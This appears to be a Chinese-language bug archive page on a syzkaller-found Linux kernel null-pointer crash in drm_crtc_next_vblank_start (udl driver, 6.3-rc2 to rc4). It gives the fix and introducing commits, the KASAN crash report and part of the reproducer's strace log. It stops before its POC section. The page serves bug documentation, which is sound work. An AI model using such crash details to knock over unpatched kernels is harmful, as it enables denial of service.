<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#id3">内核日志</a></li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#poc">POC</a></li>
</ul>
            </nav>
        </div>
    </div>
</div>

              
                
<div id="searchbox"></div>
                <article class="bd-article" role="main">
                  
  <section id="general-protection-fault-in-drm-crtc-next-vblank-start">
<h1>general protection fault in drm_crtc_next_vblank_start<a class="headerlink" href="#general-protection-fault-in-drm-crtc-next-vblank-start" title="Permalink to this heading">#</a></h1>
<section id="id1">
<h2>漏洞描述<a class="headerlink" href="#id1" title="Permalink to this heading">#</a></h2>
<p>地址：<a class="reference external" href="https://syzkaller.appspot.com/bug?extid=54280c5aea19802490b5">https://syzkaller.appspot.com/bug?extid=54280c5aea19802490b5</a></p>
<p>fix commit:  6f1ccbf07453 drm/vblank: <a class="reference external" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6f1ccbf07453eb1ee6bb24d6b531b88dd44ad229">Fix for drivers that do not drm_vblank_init</a></p>
<p>introduce commit: d39e48ca80c0960b039cb38633957f0040f63e1a <a class="reference external" href="https://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git/commit/?id=d39e48ca80c0960b039cb38633957f0040f63e1a">drm/atomic-helper: Set fence deadline for vblank</a></p>
<p>影响范围：6.3-rc2 到 6.3-rc4</p>
</section>
<section id="id2">
<h2>崩溃报告<a class="headerlink" href="#id2" title="Permalink to this heading">#</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[drm:udl_init] *ERROR* Unrecognized vendor firmware descriptor
[drm:udl_init] *ERROR* Selecting channel failed
[drm] Initialized udl 0.0.1 20120220 for 1-1:0.0 on minor 2
[drm] Initialized udl on minor 2
udl 1-1:0.0: [drm] *ERROR* Read EDID byte 0 failed err ffffffb9
udl 1-1:0.0: [drm] Cannot find any crtc or sizes
general protection fault, probably for non-canonical address 0xdffffc0000000028: 0000 [#1] PREEMPT SMP KASAN
KASAN: null-ptr-deref in range [0x0000000000000140-0x0000000000000147]
CPU: 1 PID: 2439 Comm: kworker/1:2 Not tainted 6.3.0-rc2-syzkaller #0
Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 03/02/2023
Workqueue: usb_hub_wq hub_event
RIP: 0010:drm_crtc_next_vblank_start+0xa9/0x260 drivers/gpu/drm/drm_vblank.c:1003
Code: a4 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 &lt;0f&gt; b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 24
RSP: 0018:ffffc9000b6bec28 EFLAGS: 00010207
RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffff88801d0e0408
RDX: 0000000000000028 RSI: ffffc9000b6becb0 RDI: ffff8880209a0338
RBP: ffff8880209a10d8 R08: ffff8880209a0dc8 R09: ffff8880209a0dc8
R10: ffff8880209a00a0 R11: 0000000000000012 R12: ffffc9000b6becb0
R13: 0000000000000144 R14: dffffc0000000000 R15: ffff88801d0e0400
FS:  0000000000000000(0000) GS:ffff8880b9b00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f0330cd0378 CR3: 00000000754aa000 CR4: 00000000003506e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
 &lt;TASK&gt;
 set_fence_deadline drivers/gpu/drm/drm_atomic_helper.c:1531 [inline]
 drm_atomic_helper_wait_for_fences+0x169/0x630 drivers/gpu/drm/drm_atomic_helper.c:1578
 drm_atomic_helper_commit drivers/gpu/drm/drm_atomic_helper.c:2007 [inline]
 drm_atomic_helper_commit+0x161/0x2a0 drivers/gpu/drm/drm_atomic_helper.c:1979
 drm_atomic_commit+0x1ce/0x2b0 drivers/gpu/drm/drm_atomic.c:1443
 drm_client_modeset_commit_atomic+0x54a/0x690 drivers/gpu/drm/drm_client_modeset.c:1045
 drm_client_modeset_commit_locked+0x12d/0x4c0 drivers/gpu/drm/drm_client_modeset.c:1148
 drm_client_modeset_commit+0x3b/0x60 drivers/gpu/drm/drm_client_modeset.c:1174
 drm_fb_helper_single_fb_probe drivers/gpu/drm/drm_fb_helper.c:1963 [inline]
 __drm_fb_helper_initial_config_and_unlock+0xec3/0x1450 drivers/gpu/drm/drm_fb_helper.c:2153
 drm_fbdev_client_hotplug+0x15e/0x210 drivers/gpu/drm/drm_fbdev_generic.c:384
 drm_fbdev_generic_setup+0xf5/0x350 drivers/gpu/drm/drm_fbdev_generic.c:450
 udl_usb_probe+0xd9/0x120 drivers/gpu/drm/udl/udl_drv.c:120
 usb_probe_interface+0x26c/0x820 drivers/usb/core/driver.c:396
 call_driver_probe drivers/base/dd.c:552 [inline]
 really_probe+0x1c7/0xb20 drivers/base/dd.c:631
 __driver_probe_device+0x186/0x460 drivers/base/dd.c:768
 driver_probe_device+0x44/0x110 drivers/base/dd.c:798
 __device_attach_driver+0x14e/0x270 drivers/base/dd.c:926
 bus_for_each_drv+0x102/0x190 drivers/base/bus.c:457
 __device_attach+0x19e/0x3d0 drivers/base/dd.c:998
 bus_probe_device+0x12b/0x170 drivers/base/bus.c:532
 device_add+0xee4/0x1930 drivers/base/core.c:3589
 usb_set_configuration+0xabc/0x1a20 drivers/usb/core/message.c:2171
 usb_generic_driver_probe+0x88/0xd0 drivers/usb/core/generic.c:238
 usb_probe_device+0x98/0x240 drivers/usb/core/driver.c:293
 call_driver_probe drivers/base/dd.c:552 [inline]
 really_probe+0x1c7/0xb20 drivers/base/dd.c:631
 __driver_probe_device+0x186/0x460 drivers/base/dd.c:768
 driver_probe_device+0x44/0x110 drivers/base/dd.c:798
 __device_attach_driver+0x14e/0x270 drivers/base/dd.c:926
 bus_for_each_drv+0x102/0x190 drivers/base/bus.c:457
 __device_attach+0x19e/0x3d0 drivers/base/dd.c:998
 bus_probe_device+0x12b/0x170 drivers/base/bus.c:532
 device_add+0xee4/0x1930 drivers/base/core.c:3589
 usb_new_device+0xc6e/0x1930 drivers/usb/core/hub.c:2575
 hub_port_connect drivers/usb/core/hub.c:5407 [inline]
 hub_port_connect_change drivers/usb/core/hub.c:5551 [inline]
 port_event drivers/usb/core/hub.c:5711 [inline]
 hub_event+0x24cc/0x4240 drivers/usb/core/hub.c:5793
 process_one_work+0x865/0x14b0 kernel/workqueue.c:2390
 worker_thread+0x59c/0xec0 kernel/workqueue.c:2537
 kthread+0x298/0x340 kernel/kthread.c:376
 ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:308
 &lt;/TASK&gt;
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:drm_crtc_next_vblank_start+0xa9/0x260 drivers/gpu/drm/drm_vblank.c:1003
Code: a4 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 &lt;0f&gt; b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 24
RSP: 0018:ffffc9000b6bec28 EFLAGS: 00010207
RAX: dffffc0000000000 RBX: 0000000000000000 RCX: ffff88801d0e0408
RDX: 0000000000000028 RSI: ffffc9000b6becb0 RDI: ffff8880209a0338
RBP: ffff8880209a10d8 R08: ffff8880209a0dc8 R09: ffff8880209a0dc8
R10: ffff8880209a00a0 R11: 0000000000000012 R12: ffffc9000b6becb0
R13: 0000000000000144 R14: dffffc0000000000 R15: ffff88801d0e0400
FS:  0000000000000000(0000) GS:ffff8880b9b00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f0330cd0378 CR3: 00000000211bc000 CR4: 00000000003506e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
----------------
Code disassembly (best guess), 2 bytes skipped:
   0:	00 00                	add    %al,(%rax)
   2:	48 69 db 38 02 00 00 	imul   $0x238,%rbx,%rbx
   9:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
  10:	fc ff df
  13:	49 03 9d 38 03 00 00 	add    0x338(%r13),%rbx
  1a:	4c 8d ab 44 01 00 00 	lea    0x144(%rbx),%r13
  21:	4c 89 ea             	mov    %r13,%rdx
  24:	48 c1 ea 03          	shr    $0x3,%rdx
* 28:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx &lt;-- trapping instruction
  2c:	4c 89 e8             	mov    %r13,%rax
  2f:	83 e0 07             	and    $0x7,%eax
  32:	83 c0 03             	add    $0x3,%eax
  35:	38 d0                	cmp    %dl,%al
  37:	7c 08                	jl     0x41
  39:	84 d2                	test   %dl,%dl
  3b:	0f                   	.byte 0xf
  3c:	85                   	.byte 0x85
  3d:	24                   	.byte 0x24
</pre></div>
</div>
</section>
<section id="id3">
<h2>内核日志<a class="headerlink" href="#id3" title="Permalink to this heading">#</a></h2>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>./strace-static-x86_64 -e \!wait4,clock_nanosleep,nanosleep -s 100 -x -f ./syz-executor1090894197

&lt;...&gt;
forked to background, child pid 4658
no interfaces have a carrier
[   50.939620][ T4659] 8021q: adding VLAN 0 to HW filter on device bond0
[   50.964647][ T4659] eql: remember to turn off Van-Jacobson compression on your slave devices
Starting sshd: OK

syzkaller
Warning: Permanently added &#39;10.128.1.73&#39; (ECDSA) to the list of known hosts.
execve(&quot;./syz-executor1090894197&quot;, [&quot;./syz-executor1090894197&quot;], 0x7ffcd9e2bed0 /* 10 vars */) = 0
brk(NULL)                               = 0x555556616000
brk(0x555556616c40)                     = 0x555556616c40
arch_prctl(ARCH_SET_FS, 0x555556616300) = 0
uname({sysname=&quot;Linux&quot;, nodename=&quot;syzkaller&quot;, ...}) = 0
readlink(&quot;/proc/self/exe&quot;, &quot;/root/syz-executor1090894197&quot;, 4096) = 28
brk(0x555556637c40)                     = 0x555556637c40
brk(0x555556638000)                     = 0x555556638000
mprotect(0x7f17191f2000, 16384, PROT_READ) = 0
mmap(0x1ffff000, 4096, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x1ffff000
mmap(0x20000000, 16777216, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x20000000
mmap(0x21000000, 4096, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x21000000
unshare(CLONE_NEWPID)                   = 0
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD./strace-static-x86_64: Process 5086 attached
, child_tidptr=0x5555566165d0) = 5086
[pid  5086] mount(NULL, &quot;/sys/fs/fuse/connections&quot;, &quot;fusectl&quot;, 0, NULL) = -1 EBUSY (Device or resource busy)
[pid  5086] prctl(PR_SET_PDEATHSIG, SIGKILL) = 0
[pid  5086] setsid()                    = 1
[pid  5086] prlimit64(0, RLIMIT_AS, {rlim_cur=204800*1024, rlim_max=204800*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_MEMLOCK, {rlim_cur=32768*1024, rlim_max=32768*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_FSIZE, {rlim_cur=139264*1024, rlim_max=139264*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_STACK, {rlim_cur=1024*1024, rlim_max=1024*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_CORE, {rlim_cur=131072*1024, rlim_max=131072*1024}, NULL) = 0
[pid  5086] prlimit64(0, RLIMIT_NOFILE, {rlim_cur=256, rlim_max=256}, NULL) = 0
[pid  5086] unshare(CLONE_NEWNS)        = 0
[pid  5086] mount(NULL, &quot;/&quot;, NULL, MS_REC|MS_PRIVATE, NULL) = 0
[pid  5086] unshare(CLONE_NEWIPC)       = 0
[pid  5086] unshare(CLONE_NEWCGROUP)    = 0
[pid  5086] unshare(CLONE_NEWUTS)       = 0
[pid  5086] unshare(CLONE_SYSVSEM)      = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/shmmax&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;16777216&quot;, 8)     = 8
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/shmall&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;536870912&quot;, 9)    = 9
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/shmmni&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;1024&quot;, 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/msgmax&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;8192&quot;, 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/msgmni&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;1024&quot;, 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/msgmnb&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;1024&quot;, 4)         = 4
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/kernel/sem&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;1024 1048576 500 1024&quot;, 21) = 21
[pid  5086] close(3)                    = 0
[pid  5086] getpid()                    = 1
[pid  5086] capget({version=_LINUX_CAPABILITY_VERSION_3, pid=1}, {effective=1&lt;&lt;CAP_CHOWN|1&lt;&lt;CAP_DAC_OVERRIDE|1&lt;&lt;CAP_DAC_READ_SEARCH|1&lt;&lt;CAP_FOWNER|1&lt;&lt;CAP_FSETID|1&lt;&lt;CAP_KILL|1&lt;&lt;CAP_SETGID|1&lt;&lt;CAP_SETUID|1&lt;&lt;CAP_SETPCAP|1&lt;&lt;CAP_LINUX_IMMUTABLE|1&lt;&lt;CAP_NET_BIND_SERVICE|1&lt;&lt;CAP_NET_BROADCAST|1&lt;&lt;CAP_NET_ADMIN|1&lt;&lt;CAP_NET_RAW|1&lt;&lt;CAP_IPC_LOCK|1&lt;&lt;CAP_IPC_OWNER|1&lt;&lt;CAP_SYS_MODULE|1&lt;&lt;CAP_SYS_RAWIO|1&lt;&lt;CAP_SYS_CHROOT|1&lt;&lt;CAP_SYS_PTRACE|1&lt;&lt;CAP_SYS_PACCT|1&lt;&lt;CAP_SYS_ADMIN|1&lt;&lt;CAP_SYS_BOOT|1&lt;&lt;CAP_SYS_NICE|1&lt;&lt;CAP_SYS_RESOURCE|1&lt;&lt;CAP_SYS_TIME|1&lt;&lt;CAP_SYS_TTY_CONFIG|1&lt;&lt;CAP_MKNOD|1&lt;&lt;CAP_LEASE|1&lt;&lt;CAP_AUDIT_WRITE|1&lt;&lt;CAP_AUDIT_CONTROL|1&lt;&lt;CAP_SETFCAP|1&lt;&lt;CAP_MAC_OVERRIDE|1&lt;&lt;CAP_MAC_ADMIN|1&lt;&lt;CAP_SYSLOG|1&lt;&lt;CAP_WAKE_ALARM|1&lt;&lt;CAP_BLOCK_SUSPEND|1&lt;&lt;CAP_AUDIT_READ|1&lt;&lt;CAP_PERFMON|1&lt;&lt;CAP_BPF|1&lt;&lt;CAP_CHECKPOINT_RESTORE, permitted=1&lt;&lt;CAP_CHOWN|1&lt;&lt;CAP_DAC_OVERRIDE|1&lt;&lt;CAP_DAC_READ_SEARCH|1&lt;&lt;CAP_FOWNER|1&lt;&lt;CAP_FSETID|1&lt;&lt;CAP_KILL|1&lt;&lt;CAP_SETGID|1&lt;&lt;CAP_SETUID|1&lt;&lt;CAP_SETPCAP|1&lt;&lt;CAP_LINUX_IMMUTABLE|1&lt;&lt;CAP_NET_BIND_SERVICE|1&lt;&lt;CAP_NET_BROADCAST|1&lt;&lt;CAP_NET_ADMIN|1&lt;&lt;CAP_NET_RAW|1&lt;&lt;CAP_IPC_LOCK|1&lt;&lt;CAP_IPC_OWNER|1&lt;&lt;CAP_SYS_MODULE|1&lt;&lt;CAP_SYS_RAWIO|1&lt;&lt;CAP_SYS_CHROOT|1&lt;&lt;CAP_SYS_PTRACE|1&lt;&lt;CAP_SYS_PACCT|1&lt;&lt;CAP_SYS_ADMIN|1&lt;&lt;CAP_SYS_BOOT|1&lt;&lt;CAP_SYS_NICE|1&lt;&lt;CAP_SYS_RESOURCE|1&lt;&lt;CAP_SYS_TIME|1&lt;&lt;CAP_SYS_TTY_CONFIG|1&lt;&lt;CAP_MKNOD|1&lt;&lt;CAP_LEASE|1&lt;&lt;CAP_AUDIT_WRITE|1&lt;&lt;CAP_AUDIT_CONTROL|1&lt;&lt;CAP_SETFCAP|1&lt;&lt;CAP_MAC_OVERRIDE|1&lt;&lt;CAP_MAC_ADMIN|1&lt;&lt;CAP_SYSLOG|1&lt;&lt;CAP_WAKE_ALARM|1&lt;&lt;CAP_BLOCK_SUSPEND|1&lt;&lt;CAP_AUDIT_READ|1&lt;&lt;CAP_PERFMON|1&lt;&lt;CAP_BPF|1&lt;&lt;CAP_CHECKPOINT_RESTORE, inheritable=0}) = 0
[pid  5086] capset({version=_LINUX_CAPABILITY_VERSION_3, pid=1}, {effective=1&lt;&lt;CAP_CHOWN|1&lt;&lt;CAP_DAC_OVERRIDE|1&lt;&lt;CAP_DAC_READ_SEARCH|1&lt;&lt;CAP_FOWNER|1&lt;&lt;CAP_FSETID|1&lt;&lt;CAP_KILL|1&lt;&lt;CAP_SETGID|1&lt;&lt;CAP_SETUID|1&lt;&lt;CAP_SETPCAP|1&lt;&lt;CAP_LINUX_IMMUTABLE|1&lt;&lt;CAP_NET_BIND_SERVICE|1&lt;&lt;CAP_NET_BROADCAST|1&lt;&lt;CAP_NET_ADMIN|1&lt;&lt;CAP_NET_RAW|1&lt;&lt;CAP_IPC_LOCK|1&lt;&lt;CAP_IPC_OWNER|1&lt;&lt;CAP_SYS_MODULE|1&lt;&lt;CAP_SYS_RAWIO|1&lt;&lt;CAP_SYS_CHROOT|1&lt;&lt;CAP_SYS_PACCT|1&lt;&lt;CAP_SYS_ADMIN|1&lt;&lt;CAP_SYS_BOOT|1&lt;&lt;CAP_SYS_RESOURCE|1&lt;&lt;CAP_SYS_TIME|1&lt;&lt;CAP_SYS_TTY_CONFIG|1&lt;&lt;CAP_MKNOD|1&lt;&lt;CAP_LEASE|1&lt;&lt;CAP_AUDIT_WRITE|1&lt;&lt;CAP_AUDIT_CONTROL|1&lt;&lt;CAP_SETFCAP|1&lt;&lt;CAP_MAC_OVERRIDE|1&lt;&lt;CAP_MAC_ADMIN|1&lt;&lt;CAP_SYSLOG|1&lt;&lt;CAP_WAKE_ALARM|1&lt;&lt;CAP_BLOCK_SUSPEND|1&lt;&lt;CAP_AUDIT_READ|1&lt;&lt;CAP_PERFMON|1&lt;&lt;CAP_BPF|1&lt;&lt;CAP_CHECKPOINT_RESTORE, permitted=1&lt;&lt;CAP_CHOWN|1&lt;&lt;CAP_DAC_OVERRIDE|1&lt;&lt;CAP_DAC_READ_SEARCH|1&lt;&lt;CAP_FOWNER|1&lt;&lt;CAP_FSETID|1&lt;&lt;CAP_KILL|1&lt;&lt;CAP_SETGID|1&lt;&lt;CAP_SETUID|1&lt;&lt;CAP_SETPCAP|1&lt;&lt;CAP_LINUX_IMMUTABLE|1&lt;&lt;CAP_NET_BIND_SERVICE|1&lt;&lt;CAP_NET_BROADCAST|1&lt;&lt;CAP_NET_ADMIN|1&lt;&lt;CAP_NET_RAW|1&lt;&lt;CAP_IPC_LOCK|1&lt;&lt;CAP_IPC_OWNER|1&lt;&lt;CAP_SYS_MODULE|1&lt;&lt;CAP_SYS_RAWIO|1&lt;&lt;CAP_SYS_CHROOT|1&lt;&lt;CAP_SYS_PACCT|1&lt;&lt;CAP_SYS_ADMIN|1&lt;&lt;CAP_SYS_BOOT|1&lt;&lt;CAP_SYS_RESOURCE|1&lt;&lt;CAP_SYS_TIME|1&lt;&lt;CAP_SYS_TTY_CONFIG|1&lt;&lt;CAP_MKNOD|1&lt;&lt;CAP_LEASE|1&lt;&lt;CAP_AUDIT_WRITE|1&lt;&lt;CAP_AUDIT_CONTROL|1&lt;&lt;CAP_SETFCAP|1&lt;&lt;CAP_MAC_OVERRIDE|1&lt;&lt;CAP_MAC_ADMIN|1&lt;&lt;CAP_SYSLOG|1&lt;&lt;CAP_WAKE_ALARM|1&lt;&lt;CAP_BLOCK_SUSPEND|1&lt;&lt;CAP_AUDIT_READ|1&lt;&lt;CAP_PERFMON|1&lt;&lt;CAP_BPF|1&lt;&lt;CAP_CHECKPOINT_RESTORE, inheritable=0}) = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 3
[pid  5086] access(&quot;/proc/net&quot;, R_OK)   = 0
[pid  5086] access(&quot;/proc/net/unix&quot;, R_OK) = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;nr0&quot;, ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x17\x00\x00\x00\x08\x00\x02\x00\xac\x1e\x00\x01\x08\x00\x01\x00\xac\x1e\x00\x01&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=RTM_NEWADDR, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|NLM_F_REPLACE|NLM_F_CREATE, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;nr0&quot;, ifr_ifindex=23}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, {ifi_family=AF_UNSPEC, ifi_type=ARPHRD_NETROM, ifi_index=if_nametoindex(&quot;nr0&quot;), ifi_flags=IFF_UP, ifi_change=0x1}, [{nla_len=11, nla_type=IFLA_ADDRESS}, bb:bb:bb:00:00:00:00]], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;rose0&quot;, ifr_ifindex=39}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=RTM_NEWADDR, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|NLM_F_REPLACE|NLM_F_CREATE, nlmsg_seq=0, nlmsg_pid=0}, {ifa_family=AF_INET, ifa_prefixlen=24, ifa_flags=0, ifa_scope=RT_SCOPE_UNIVERSE, ifa_index=if_nametoindex(&quot;rose0&quot;)}, [[{nla_len=8, nla_type=IFA_LOCAL}, inet_addr(&quot;172.30.1.1&quot;)], [{nla_len=8, nla_type=IFA_ADDRESS}, inet_addr(&quot;172.30.1.1&quot;)]]], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=RTM_NEWADDR, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|NLM_F_REPLACE|NLM_F_CREATE, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;rose0&quot;, ifr_ifindex=39}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, {ifi_family=AF_UNSPEC, ifi_type=ARPHRD_NETROM, ifi_index=if_nametoindex(&quot;rose0&quot;), ifi_flags=0, ifi_change=0}, [{nla_len=9, nla_type=IFLA_ADDRESS}, bb:bb:bb:01:00]], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=RTM_NEWLINK, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(3)                    = 0
[pid  5086] unshare(CLONE_NEWNET)       = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/net/ipv4/ping_group_range&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;0 65535&quot;, 7)      = 7
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/dev/net/tun&quot;, O_RDWR|O_NONBLOCK) = 3
[pid  5086] dup2(3, 200)                = 200
[pid  5086] close(3)                    = 0
[pid  5086] ioctl(200, TUNSETIFF, 0x7ffe55bbe510) = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/net/ipv6/conf/syz_tun/accept_dad&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;0&quot;, 1)            = 1
[pid  5086] close(3)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/proc/sys/net/ipv6/conf/syz_tun/router_solicitations&quot;, O_WRONLY|O_CLOEXEC) = 3
[pid  5086] write(3, &quot;0&quot;, 1)            = 1
[pid  5086] close(3)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 3
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;syz_tun&quot;, ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x0b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\xaa\x08\x00\x01\x00\xac\x14\x14\xaa&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;syz_tun&quot;, ifr_ifindex=11}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x0b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
